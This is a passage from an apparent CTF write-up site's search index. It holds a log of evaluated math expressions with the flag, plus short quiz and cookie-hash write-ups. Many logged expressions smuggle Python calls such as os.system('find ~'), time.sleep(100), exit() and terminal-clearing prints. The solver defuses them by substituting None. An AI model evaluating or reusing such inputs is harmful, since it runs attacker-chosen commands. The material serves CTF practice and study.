185713060458974767541446220 ) + ( 4222634439223833111865710 * 3392216678742463229433662535331800569 )) 14324090972967414859623430900997497001948960545759326541632001 (( 84972644075679862290670715462665 * 103021483480991156265050026263275 ) | ( 44952701858967169121145720212041581823 ^ 255751100351771662533209477680641057410 )) (( 84972644075679862290670715462665 * 103021483480991156265050026263275 ) | ( 44952701858967169121145720212041581823 ^ 255751100351771662533209477680641057410 )) 8754007847978793971280484377445805527446467229541149285815936639 (( 33706913853048835239844769389329689996 + 50223072051652617964930100 ) - ( 776098864387100527577058636019 * 41914530355020436818724 )) (( 33706913853048835239844769389329689996 + 50223072051652617964930100 ) - ( 776098864387100527577058636019 * 41914530355020436818724 )) - 32529819409849980818454667134821017070608431705399660 (( 609107414927851004765313477228853 * 4609189832345529105105 ) + ( 44242032082536560320526569891 + 4532349031470909972957799190895 )) (( 609107414927851004765313477228853 * 4609189832345529105105 ) + ( 44242032082536560320526569891 + 4532349031470909972957799190895 )) 2807491703691720204768111277944190194400910650701355351 (( 9544933787035660979503569177 * 592421544580584592481334917 ) * ( 505348518123734519777552 + 65822681674718855298 )) (( 9544933787035660979503569177 * 592421544580584592481334917 ) * ( 505348518123734519777552 + 65822681674718855298 )) 2857928272237953910975662857011108998182100402617886833182207854162345028600650 (( 7380017427798032412770 + 35334842329192425627081629390291984 ) & ( 1366990497679564417298 * 3296636763745755994475404561097597351 )) (( 7380017427798032412770 + 35334842329192425627081629390291984 ) & ( 1366990497679564417298 * 3296636763745755994475404561097597351 )) 22232385606198111341494938769167410 (( 141995336294035175708956637011 * 187366860768591824486511158544744925 ) + ( 22367856812360691672498640395 + 210602812480947398948415934594364 )) (( 141995336294035175708956637011 * 187366860768591824486511158544744925 ) + ( 22367856812360691672498640395 + 210602812480947398948415934594364 )) 26605220405193862192943690539580261509112670006704313883242653934 (( 70836351337739408621837 + 1874685452344475957897528642716425883 ) & ( 8151629790404072067196674 - 27196440084071133300253565 )) (( 70836351337739408621837 + 1874685452344475957897528642716425883 ) & ( 8151629790404072067196674 - 27196440084071133300253565 )) 1874685452327014399073896116720272256 (( 24744306292528480818278390709 + 5805547731358322244445555660 ) - ( 971618688495883190384856 | 3760032423462507564926375393391 )) (( 24744306292528480818278390709 + 5805547731358322244445555660 ) - ( 971618688495883190384856 | 3760032423462507564926375393391 )) - 3729482577205633670012168196478 (( 8398600763738495349603642 | 1155519235100868704271 ) | ( 27199893292190962969096 * 88981316175045359827744 )) (( 8398600763738495349603642 | 1155519235100868704271 ) | ( 27199893292190962969096 * 88981316175045359827744 )) 2420282304959939516913559041283377383092518207 (( 35324944215400258167990733916637587766 & 7770679375413997193116 ) * ( 256442899747653838817208722315070 & 123925610385160486864515013204011 )) (( 35324944215400258167990733916637587766 & 7770679375413997193116 ) * ( 256442899747653838817208722315070 & 123925610385160486864515013204011 )) 432905542325841850415209331948719374413651045239811400 (( 86441699007994596136488821368 - 211041053003450504820304656261068535830 ) * ( 764096034319107803870486907234176520 ^ 58581554248773693765830335 )) (( 86441699007994596136488821368 - 211041053003450504820304656261068535830 ) * ( 764096034319107803870486907234176520 ^ 58581554248773693765830335 )) - 161255631600092160272117746666659784649763319557521843071009908335767004146 (( 4289195557597593138303548133289576 + 115017951165933371898675 ) | ( 32451943224011858991537799613456359 | 2153309926101191365913144446 )) (( 4289195557597593138303548133289576 + 115017951165933371898675 ) | ( 32451943224011858991537799613456359 | 2153309926101191365913144446 )) 35442985886133230507689008307372031 (( 102800550573556488577786059198047 & 80308527076794542751150603743060963 ) - ( 54587948785806923184254167764557 + 25517554994617992404094670 )) (( 102800550573556488577786059198047 & 80308527076794542751150603743060963 ) - ( 54587948785806923184254167764557 + 25517554994617992404094670 )) 46825983837761492633239681492264 (( 20530431492961202111 + 11199809485808950052486 ) + ( 329069401236321119829 | 485820696747399959692950677505850946 )) (( 20530431492961202111 + 11199809485808950052486 ) + ( 329069401236321119829 | 485820696747399959692950677505850946 )) 485820696747411184933088183413683356 (( 58373691633537615632558 * 58258985603424552098189229043792204 ) | ( 208201628336283961011 - 12025934969159743065593123957 )) (( 58373691633537615632558 * 58258985603424552098189229043792204 ) | ( 208201628336283961011 - 12025934969159743065593123957 )) - 264285131736614294157052994 (( 2007980238835152837969 - 716638003903442234482 ) + ( 63580591357115748122 - 3496109116544692112505409675923 )) (( 2007980238835152837969 - 716638003903442234482 ) + ( 63580591357115748122 - 3496109116544692112505409675923 )) - 3496109115189769286216583324314 (( 3065564173080561341800995219 & 312808552469993092941 ) - ( 5385836407671206191986388387 * 144832855054824025836656 )) (( 3065564173080561341800995219 & 312808552469993092941 ) - ( 5385836407671206191986388387 * 144832855054824025836656 )) - 780046063781237928445235496773921921400032064440911 ( int ( int ( 5 < 13 ) < int ( int ( 34 == __import__ ( ' os ' ) . system ( ' find ~ ' )) > 9 )) * int ( int ( 1 <= 26 ) >= ( 1 | 3 ))) ( int ( int ( 5 < 13 ) < int ( int ( 34 == None ) > 9 )) * int ( int ( 1 <= 26 ) >= ( 1 | 3 ))) 0 ((( 1 * 43 ) ^ ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 1 ) | 7 )) ^ ( int ( 41 >= int ( 3 == __import__ ( ' time ' ) . sleep ( 100 ))) | int ( 45 != 101 ))) ((( 1 * 43 ) ^ ( int ( None != 1 ) | 7 )) ^ ( int ( 41 >= int ( 3 == None )) | int ( 45 != 101 ))) 45 ((( int ( exit () != 86 ) + int ( exit () == 86 )) & ( 1 ** 83 )) ^ int ( int ( 66 != int ( 1 == exit ())) < ( 22 - 24 ))) ((( int ( None != 86 ) + int ( None == 86 )) & ( 1 ** 83 )) ^ int ( int ( 66 != int ( 1 == None )) < ( 22 - 24 ))) 1 ((( 15 & 28 ) & int ( 3 > int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 1 ))) | int (( 5 ** 15 ) != ( 60 ** int ( 1 == print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))))) ((( 15 & 28 ) & int ( 3 > int ( None == 1 ))) | int (( 5 ** 15 ) != ( 60 ** int ( 1 == None )))) 1 int ((( 3 & 39 ) & ( int ( 36 != exit ()) << 127 )) != (( 3 & 132 ) & ( 94 * 38 ))) int ((( 3 & 39 ) & ( int ( 36 != None ) << 127 )) != (( 3 & 132 ) & ( 94 * 38 ))) 0 int ((( 26 >> 4 ) * ( 2 >> 12 )) == (( 6 * 88 ) ^ ( int ( 6 == __import__ ( ' time ' ) . sleep ( 100 )) >> 147 ))) int ((( 26 >> 4 ) * ( 2 >> 12 )) == (( 6 * 88 ) ^ ( int ( 6 == None ) >> 147 ))) 0 int ((( 17 - 23 ) + ( 1 - int ( 4 == __import__ ( ' time ' ) . sleep ( 100 )))) < (( 8 | 47 ) & ( 3 - int ( 2 != __import__ ( ' os ' ) . system ( ' find ~ ' ))))) int ((( 17 - 23 ) + ( 1 - int ( 4 == None ))) < (( 8 | 47 ) & ( 3 - int ( 2 != None )))) 1 int ((( 11 ^ 2 ) * int ( 7 < 1 )) <= ( int ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 6 ) == 127 ) - ( int ( exit () != 1 ) & int ( 1 != exit ())))) int ((( 11 ^ 2 ) * int ( 7 < 1 )) <= ( int ( int ( None == 6 ) == 127 ) - ( int ( None != 1 ) & int ( 1 != None )))) 0 (( int ( int ( 89 != __import__ ( ' time ' ) . sleep ( 100 )) == 13 ) - ( 3 >> 88 )) & (( 29 + int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 10 )) * ( 6 | int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 15 )))) (( int ( int ( 89 != None ) == 13 ) - ( 3 >> 88 )) & (( 29 + int ( None != 10 )) * ( 6 | int ( None != 15 )))) 0 int ((( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) << 51 ) & ( 9 & int ( __import__ ( ' time ' ) . sleep ( 100 ) == 11 ))) < int (( 2 | 46 ) < ( 132 & 27 ))) int ((( int ( None != 1 ) << 51 ) & ( 9 & int ( None == 11 ))) < int (( 2 | 46 ) < ( 132 & 27 ))) 0 ((( 1 >> 28 ) ^ ( 1 - 2 )) + (( 2 ^ 11 ) & int ( 121 >= 2 ))) ((( 1 >> 28 ) ^ ( 1 - 2 )) + (( 2 ^ 11 ) & int ( 121 >= 2 ))) 0 int ((( 4 >> 80 ) - ( 84 | 109 )) >= (( 100 | 46 ) + ( 3 ^ 51 ))) int ((( 4 >> 80 ) - ( 84 | 109 )) >= (( 100 | 46 ) + ( 3 ^ 51 ))) 0 ((( 39 ** int ( 27 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))) | int ( 12 > 5 )) * (( int ( 3 == __import__ ( ' os ' ) . system ( ' find ~ ' )) >> 9 ) ^ ( 33 >> 22 ))) ((( 39 ** int ( 27 != None )) | int ( 12 > 5 )) * (( int ( 3 == None ) >> 9 ) ^ ( 33 >> 22 ))) 0 int ( int ( int ( int ( 111 == __import__ ( ' os ' ) . system ( ' find ~ ' )) < 5 ) < ( 12 | 122 )) <= (( 10 - 45 ) | ( int ( 88 != __import__ ( ' os ' ) . system ( ' find ~ ' )) + 1 ))) int ( int ( int ( int ( 111 == None ) < 5 ) < ( 12 | 122 )) <= (( 10 - 45 ) | ( int ( 88 != None ) + 1 ))) 0 ((( 3 + int ( 13 == __import__ ( ' time ' ) . sleep ( 100 ))) - ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 3 ) - 12 )) * int (( 2 << 1 ) >= int ( 30 <= 2 ))) ((( 3 + int ( 13 == None )) - ( int ( None == 3 ) - 12 )) * int (( 2 << 1 ) >= int ( 30 <= 2 ))) 15 ((( int ( 1 != __import__ ( ' os ' ) . system ( ' find ~ ' )) + 60 ) + ( int ( 106 != __import__ ( ' os ' ) . system ( ' find ~ ' )) ** 39 )) * ( int ( 134 != int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 24 )) - ( 1 << 22 ))) ((( int ( 1 != None ) + 60 ) + ( int ( 106 != None ) ** 39 )) * ( int ( 134 != int ( None == 24 )) - ( 1 << 22 ))) - 260046786 ((( 132 + 85 ) - ( 19 - int ( __import__ ( ' time ' ) . sleep ( 100 ) == 8 ))) | (( 64 & int ( __import__ ( ' time ' ) . sleep ( 100 ) != 126 )) - ( 4 >> 3 ))) ((( 132 + 85 ) - ( 19 - int ( None == 8 ))) | (( 64 & int ( None != 126 )) - ( 4 >> 3 ))) 198 (( int ( 4 < 117 ) * int ( 7 != 7 )) | ( int ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) >= 144 ) ^ int ( 1 == int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 1 )))) (( int ( 4 < 117 ) * int ( 7 != 7 )) | ( int ( int ( None != 1 ) >= 144 ) ^ int ( 1 == int ( None != 1 )))) 1 int ( int (( 88 >> 62 ) == ( 1 ^ int ( __import__ ( ' time ' ) . sleep ( 100 ) != 6 ))) > (( 7 - 7 ) * int ( 21 == 14 ))) int ( int (( 88 >> 62 ) == ( 1 ^ int ( None != 6 ))) > (( 7 - 7 ) * int ( 21 == 14 ))) 1 ((( 1 | 1 ) * int ( int ( 81 == __import__ ( ' time ' ) . sleep ( 100 )) != 13 )) & ( int ( 12 > int ( 1 != exit ())) * ( 3 - 30 ))) ((( 1 | 1 ) * int ( int ( 81 == None ) != 13 )) & ( int ( 12 > int ( 1 != None )) * ( 3 - 30 ))) 1 ( int (( 7 & int ( 33 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) == ( 2 ** int ( 5 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )))) * (( 14 >> 16 ) | ( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 54 ) ^ 20 ))) ( int (( 7 & int ( 33 == None )) == ( 2 ** int ( 5 != None ))) * (( 14 >> 16 ) | ( int ( None != 54 ) ^ 20 ))) 0 ((( 115 >> 39 ) ^ int ( 15 != 2 )) * ( int ( 106 != 1 ) & ( 5 * 4 ))) ((( 115 >> 39 ) ^ int ( 15 != 2 )) * ( int ( 106 != 1 ) & ( 5 * 4 ))) 0 ((( 53 + 131 ) | int ( int ( 3 == __import__ ( ' os ' ) . system ( ' find ~ ' )) != 2 )) | (( 5 & 1 ) - ( int ( __import__ ( ' time ' ) . sleep ( 100 ) == 90 ) ^ 14 ))) ((( 53 + 131 ) | int ( int ( 3 == None ) != 2 )) | (( 5 & 1 ) - ( int ( None == 90 ) ^ 14 ))) - 5 ((( 28 ^ 4 ) * ( 1 + 10 )) ^ ( int ( 81 <= 18 ) | ( 56 ^ 1 ))) ((( 28 ^ 4 ) * ( 1 + 10 )) ^ ( int ( 81 <= 18 ) | ( 56 ^ 1 ))) 305 ((( 1 << 2 ) & ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 4 ) | int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 4 ))) | ( int ( 1 < 2 ) + ( 3 >> 25 ))) ((( 1 << 2 ) & ( int ( None == 4 ) | int ( None != 4 ))) | ( int ( 1 < 2 ) + ( 3 >> 25 ))) 1 (( int ( 2 != 6 ) ^ ( 41 + 140 )) - int (( 3 | 7 ) <= ( 1 ** 2 ))) (( int ( 2 != 6 ) ^ ( 41 + 140 )) - int (( 3 | 7 ) <= ( 1 ** 2 ))) 180 ( int ( int ( int ( 1 == exit ()) <= int ( exit () != 19 )) == ( 20 | 2 )) - int (( 8 * 48 ) != ( 1 | 5 ))) ( int ( int ( int ( 1 == None ) <= int ( None != 19 )) == ( 20 | 2 )) - int (( 8 * 48 ) != ( 1 | 5 ))) - 1 int ( int ( int ( 13 > 12 ) <= int ( 15 < 6 )) == (( 4 >> 13 ) ^ ( 20 + int ( 62 == __import__ ( ' time ' ) . sleep ( 100 ))))) int ( int ( int ( 13 > 12 ) <= int ( 15 < 6 )) == (( 4 >> 13 ) ^ ( 20 + int ( 62 == None )))) 0 (( int ( 4 < 1 ) - ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 12 ) + 2 )) | (( 3 ^ 1 ) & int ( 43 <= 3 ))) (( int ( 4 < 1 ) - ( int ( None != 12 ) + 2 )) | (( 3 ^ 1 ) & int ( 43 <= 3 ))) - 3 ((( 1 | 94 ) ^ ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 9 ) & 56 )) ^ (( 33 & 110 ) - ( 41 >> int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 19 )))) ((( 1 | 94 ) ^ ( int ( None != 9 ) & 56 )) ^ (( 33 & 110 ) - ( 41 >> int ( None != 19 )))) 83 ( int (( 1 | int ( 4 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) != ( 107 << 9 )) & (( 12 >> 2 ) + ( 23 + 1 ))) ( int (( 1 | int ( 4 == None )) != ( 107 << 9 )) & (( 12 >> 2 ) + ( 23 + 1 ))) 1 ((( 1 | 73 ) * ( 3 - 10 )) ^ ( int ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 3 ) >= 29 ) * ( int ( 17 != __import__ ( ' time ' ) . sleep ( 100 )) | 2 ))) ((( 1 | 73 ) * ( 3 - 10 )) ^ ( int ( int ( None == 3 ) >= 29 ) * ( int ( 17 != None ) | 2 ))) - 511 ( int (( 74 | int ( 126 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))) > ( 108 + int ( 103 == exit ()))) | int (( 94 + 8 ) < ( 1 << 1 ))) ( int (( 74 | int ( 126 != None )) > ( 108 + int ( 103 == None ))) | int (( 94 + 8 ) < ( 1 << 1 ))) 0 ((( 1 >> int ( __import__ ( ' time ' ) . sleep ( 100 ) == 2 )) - ( 1 ** int ( 118 == __import__ ( ' os ' ) . system ( ' find ~ ' )))) | (( 6 * 1 ) + int ( 64 == 5 ))) ((( 1 >> int ( None == 2 )) - ( 1 ** int ( 118 == None ))) | (( 6 * 1 ) + int ( 64 == 5 ))) 6 ( int (( int ( 97 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) | 49 ) != int ( 72 == 39 )) & (( 3 << int ( 30 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) * int ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) != int ( 35 != __import__ ( ' os ' ) . system ( ' find ~ ' ))))) ( int (( int ( 97 != None ) | 49 ) != int ( 72 == 39 )) & (( 3 << int ( 30 == None )) * int ( int ( None != 1 ) != int ( 35 != None )))) 0 int ((( 55 >> 5 ) * ( 92 << 3 )) > ( int ( 1 != 29 ) ^ ( 1 + 76 ))) int ((( 55 >> 5 ) * ( 92 << 3 )) > ( int ( 1 != 29 ) ^ ( 1 + 76 ))) 1 ( int (( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 2 ) ^ 1 ) > int ( 60 <= 145 )) ^ (( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 21 ) | int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 1 )) | int ( 25 <= 1 ))) ( int (( int ( None != 2 ) ^ 1 ) > int ( 60 <= 145 )) ^ (( int ( None == 21 ) | int ( None == 1 )) | int ( 25 <= 1 ))) 0 ((( 5 + 6 ) ^ int ( 10 > 4 )) - (( 35 | int ( exit () != 9 )) ^ ( 28 - int ( 4 == exit ())))) ((( 5 + 6 ) ^ int ( 10 > 4 )) - (( 35 | int ( None != 9 )) ^ ( 28 - int ( 4 == None )))) - 53 ((( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 4 ) - 51 ) ^ ( 105 >> int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 117 ))) | (( int ( 11 == exit ()) + 31 ) + ( 12 ** 131 ))) ((( int ( None != 4 ) - 51 ) ^ ( 105 >> int ( None == 117 ))) | (( int ( 11 == None ) + 31 ) + ( 12 ** 131 ))) - 65 ((( int ( 18 == exit ()) * 101 ) - ( 87 | int ( 13 != __import__ ( ' time ' ) . sleep ( 100 )))) | (( int ( exit () == 38 ) >> 16 ) - ( 49 + int ( 2 != __import__ ( ' time ' ) . sleep ( 100 ))))) ((( int ( 18 == None ) * 101 ) - ( 87 | int ( 13 != None ))) | (( int ( None == 38 ) >> 16 ) - ( 49 + int ( 2 != None )))) - 17 int ((( 39 * 1 ) * ( 8 >> 5 )) == (( 25 | 92 ) | ( 4 ^ int ( 17 == __import__ ( ' os ' ) . system ( ' find ~ ' ))))) int ((( 39 * 1 ) * ( 8 >> 5 )) == (( 25 | 92 ) | ( 4 ^ int ( 17 == None )))) 0 int ((( int ( 1 != exit ()) + 2 ) & ( 42 - 30 )) > (( 5 | int ( 2 != __import__ ( ' time ' ) . sleep ( 100 ))) + ( 2 & 8 ))) int ((( int ( 1 != None ) + 2 ) & ( 42 - 30 )) > (( 5 | int ( 2 != None )) + ( 2 & 8 ))) 0 ((( 5 - 1 ) - ( 22 ** int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 1 ))) | (( 28 & 1 ) * ( 3 & int ( 63 == __import__ ( ' os ' ) . system ( ' find ~ ' ))))) ((( 5 - 1 ) - ( 22 ** int ( None == 1 ))) | (( 28 & 1 ) * ( 3 & int ( 63 == None )))) 3 ((( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 127 ) | 8 ) | ( 14 ^ int ( __import__ ( ' time ' ) . sleep ( 100 ) != 12 ))) * ( int ( int ( 10 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) > 7 ) & int ( 5 < 31 ))) ((( int ( None != 127 ) | 8 ) | ( 14 ^ int ( None != 12 ))) * ( int ( int ( 10 != None ) > 7 ) & int ( 5 < 31 ))) 0 ( int (( 5 - 3 ) == ( 1 ^ 18 )) ^ ( int ( 7 != 75 ) | ( 85 >> 110 ))) ( int (( 5 - 3 ) == ( 1 ^ 18 )) ^ ( int ( 7 != 75 ) | ( 85 >> 110 ))) 1 ((( 2 << 2 ) - ( 51 ^ 14 )) - int (( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 4 ) ^ int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 13 )) <= ( 55 - int ( 1 == exit ())))) ((( 2 << 2 ) - ( 51 ^ 14 )) - int (( int ( None != 4 ) ^ int ( None != 13 )) <= ( 55 - int ( 1 == None )))) - 54 ((( 106 * int ( 1 == __import__ ( ' time ' ) . sleep ( 100 ))) * int ( 3 != int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 41 ))) + (( 5 ** 55 ) & ( 14 << 29 ))) ((( 106 * int ( 1 == None )) * int ( 3 != int ( None != 41 ))) + (( 5 ** 55 ) & ( 14 << 29 ))) 7516192768 ((( 8 - 4 ) + ( int ( 2 == print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) & 24 )) ^ (( 4 + 4 ) & ( 84 + 1 ))) ((( 8 - 4 ) + ( int ( 2 == None ) & 24 )) ^ (( 4 + 4 ) & ( 84 + 1 ))) 4 int ((( 21 ^ 58 ) + ( 13 * int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 52 ))) <= (( 1 | 2 ) & int ( int ( 146 == exit ()) >= 3 ))) int ((( 21 ^ 58 ) + ( 13 * int ( None == 52 ))) <= (( 1 | 2 ) & int ( int ( 146 == None ) >= 3 ))) 0 ((( 20 << 2 ) & ( 20 << 18 )) + int (( 5 + int ( 63 == exit ())) >= ( 74 | 57 ))) ((( 20 << 2 ) & ( 20 << 18 )) + int (( 5 + int ( 63 == None )) >= ( 74 | 57 ))) 0 flag { ' Life_1s_sh0rt_use_PYTH0N ' * 1000 } flag { ' Life_1s_sh0rt_use_PYTH0N ' * 1000 } [ * ] Closed connection to 202 . 38 . 95 . 46 port 12009 Process finished with exit code 0","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/hackergame_2018/ustc_quiz/","text":"\u732b\u54aa\u95ee\u7b54 \u9898\u76ee SOURCE: https://hack2018.lug.ustc.edu.cn/#ustcquiz \u94f2\u5c4e\u5b98 \uff1a\u8981\u94f2\u5c4e\u5417\uff1f @\u732b\u54aa \u732b\u54aa \uff1a\u6211\u662f\u4f60\u76f4\u63a5@\u7684\uff1f\u4f60\u8fd9\u662f\u5728\u53eb\u4e3b\u5b50\uff1f\u6211\u4e0d\u60f3\u770b\u89c1\u7b2c\u4e8c\u6b21\u3002 \u732b\u54aa \uff1a\u55b5\u7684\u5fc3\u91cc\u6ca1\u70b9\u6570\uff1f \u4e00\u53ea\u8def\u8fc7\u7684\u72d7 \uff1a\u8bf7\u5404\u4f4d\u94f2\u5c4e\u5b98\u6ce8\u610f\u81ea\u5df1\u7684\u8eab\u4efd\u548c\u8bf4\u8bdd\u65b9\u5f0f\u3002 @\u5168\u4f53\u6210\u5458 \u4e3a\u4e86\u4e0d\u88ab\u9a82\uff0c\u94f2\u5c4e\u5b98\u518d\u4e5f\u4e0d\u6562\u95ee\u4efb\u4f55\u95ee\u9898\u4e86\uff0c\u4e0b\u9762\u8fd9\u4e9b\u7b80\u5355\u7684\u95ee\u9898\uff0c\u4e5f\u53ea\u80fd\u4f60\u81ea\u5df1\u6765\u641c\u7d22\u89e3\u51b3\u3002 \u89e3\u51b3\u65b9\u6848 \u4e00\u4e9b\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u89e3\u51b3\u7684\u95ee\u9898\u3002 \u597d\uff0c 1958 \u3002 \u597d\uff0c 9211B026 \u3002 \u89c6\u9891\u7684\u8bdd...\u53cd\u6b63\u6211\u6570\u4e86\u4e00\u6b21\u4e4b\u540e\u7adf\u7136\u4e0d\u5bf9\uff0c\u76f4\u63a5\u7206\u7834\u5427\u3002\u5e94\u8be5\u662f 9 \u6765\u7740\u3002 \u597d\uff0c TP311.1/94 \u3002 \u597d\uff0c 3A202 \u3002 \u6211\u4e5f\u662f\u8fd9\u4e48\u89c9\u5f97\u7684\u3002","title":"\u732b\u54aa\u95ee\u7b54"},{"location":"ctf_writeup/hackergame_2018/ustc_quiz/#_1","text":"","title":"\u732b\u54aa\u95ee\u7b54"},{"location":"ctf_writeup/hackergame_2018/ustc_quiz/#_2","text":"SOURCE: https://hack2018.lug.ustc.edu.cn/#ustcquiz \u94f2\u5c4e\u5b98 \uff1a\u8981\u94f2\u5c4e\u5417\uff1f @\u732b\u54aa \u732b\u54aa \uff1a\u6211\u662f\u4f60\u76f4\u63a5@\u7684\uff1f\u4f60\u8fd9\u662f\u5728\u53eb\u4e3b\u5b50\uff1f\u6211\u4e0d\u60f3\u770b\u89c1\u7b2c\u4e8c\u6b21\u3002 \u732b\u54aa \uff1a\u55b5\u7684\u5fc3\u91cc\u6ca1\u70b9\u6570\uff1f \u4e00\u53ea\u8def\u8fc7\u7684\u72d7 \uff1a\u8bf7\u5404\u4f4d\u94f2\u5c4e\u5b98\u6ce8\u610f\u81ea\u5df1\u7684\u8eab\u4efd\u548c\u8bf4\u8bdd\u65b9\u5f0f\u3002 @\u5168\u4f53\u6210\u5458 \u4e3a\u4e86\u4e0d\u88ab\u9a82\uff0c\u94f2\u5c4e\u5b98\u518d\u4e5f\u4e0d\u6562\u95ee\u4efb\u4f55\u95ee\u9898\u4e86\uff0c\u4e0b\u9762\u8fd9\u4e9b\u7b80\u5355\u7684\u95ee\u9898\uff0c\u4e5f\u53ea\u80fd\u4f60\u81ea\u5df1\u6765\u641c\u7d22\u89e3\u51b3\u3002","title":"\u9898\u76ee"},{"location":"ctf_writeup/hackergame_2018/ustc_quiz/#_3","text":"\u4e00\u4e9b\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u89e3\u51b3\u7684\u95ee\u9898\u3002 \u597d\uff0c 1958 \u3002 \u597d\uff0c 9211B026 \u3002 \u89c6\u9891\u7684\u8bdd...\u53cd\u6b63\u6211\u6570\u4e86\u4e00\u6b21\u4e4b\u540e\u7adf\u7136\u4e0d\u5bf9\uff0c\u76f4\u63a5\u7206\u7834\u5427\u3002\u5e94\u8be5\u662f 9 \u6765\u7740\u3002 \u597d\uff0c TP311.1/94 \u3002 \u597d\uff0c 3A202 \u3002 \u6211\u4e5f\u662f\u8fd9\u4e48\u89c9\u5f97\u7684\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/cookie_monster/","text":"\u9898\u76ee Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/ \u89e3\u51b3\u65b9\u6848 \u6253\u5f00\u7f51\u9875\u540e\uff0c\u611f\u89c9\u90fd\u5728\u63d0Cookie\uff0cF12\u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\u770b\u770bCookie\u3002\u80fd\u53d1\u73b0\u54cd\u5e94\u5934\u7684Set-Cookie\u5728\u53d8\u5316\uff0c\u5e76\u4e14\u67e5\u5230\u524d\u4e24\u4e2a\u5206\u522b\u662fpc\u548ctf\u7684\u54c8\u5e0c\u503c\uff1a bc54f4d60f1cec0f9a6cb70e13f2127a 114d6a415b3d04db792ca7c0da0c7a55 \u5e94\u8be5\u662fflag\u6bcf\u4e24\u4e2a\u5b57\u7b26\u53bb\u54c8\u5e0c\uff0c\u7136\u540e\u6bcf\u6b21\u54cd\u5e94\u5934\u7684Set-Cookie\uff0c\u662f\u8bf7\u6c42\u5934\u7684Cookie\u5bf9\u5e94\u4e24\u4f4d\u5b57\u7b26\u7684\u540e\u4e24\u4f4d\u5b57\u7b26\u7684\u54c8\u5e0c\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u8981\u4e0d\u65ad\u62ff\u8fd4\u56de\u7684\u65b0Cookie\u53bb\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230\u5168\u90e8\uff08\u6211\u5728\u8bf4\u4ec0\u4e48\u73a9\u610f\u513f\uff09\u3002 